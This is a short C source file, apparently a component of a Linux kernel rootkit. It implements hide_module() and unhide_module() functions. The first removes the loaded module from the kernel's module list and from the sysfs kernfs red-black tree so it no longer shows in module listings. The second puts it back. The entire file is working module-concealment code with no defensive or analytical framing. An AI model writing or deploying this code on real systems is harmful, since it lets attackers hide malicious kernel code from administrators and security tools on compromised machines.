#include <linux/kernfs.h>
#include <linux/module.h>
#include <linux/rbtree.h>
#include <linux/list.h>
#include <linux/hash.h>

#include "common.h"
#include "modhide.h"

static struct list_head *mod;

void
hide_module(void)
{
    struct kernfs_node *knode;

    if (mod)
        return;

    knode = THIS_MODULE->mkobj.kobj.sd;
    mod = THIS_MODULE->list.prev;

    list_del(&THIS_MODULE->list);
    rb_erase(&knode->rb, &knode->parent->dir.children);
    knode->rb.__rb_parent_color = (unsigned long)(&knode->rb);
}

void
unhide_module(void)
{
    int res;
    struct kernfs_node *rb;
    struct rb_root *root;
    struct rb_node *parent;
    struct rb_node **new;

    if (!mod)
        return;

    rb = THIS_MODULE->mkobj.kobj.sd;
    root = &rb->parent->dir.children;
    new = &root->rb_node;
    parent = NULL;

    list_add(&THIS_MODULE->list, mod);

    { // insert our module back into the RB tree of modules
        // search for the place to insert, insert, then rebalance tree,
        // as per https://www.kernel.org/doc/Documentation/rbtree.txt
        while (*new) {
            static struct kernfs_node *new_rb;

            parent = *new;
            new_rb = rb_entry(*new, struct kernfs_node, rb);

            // https://elixir.bootlin.com/linux/v4.19/source/include/linux/kernfs.h#L132
            res = (new_rb->ns == rb->ns)
                ? strcmp(rb->name, new_rb->name)
                : (rb->ns - new_rb->ns);

            if (res < 0)
                new = &((*new)->rb_left);
            else if (res > 0)
                new = &((*new)->rb_right);
            else
                return;
        }

        rb_link_node(&rb->rb, parent, new);
        rb_insert_color(&rb->rb, root);
    }

    mod = NULL;
}
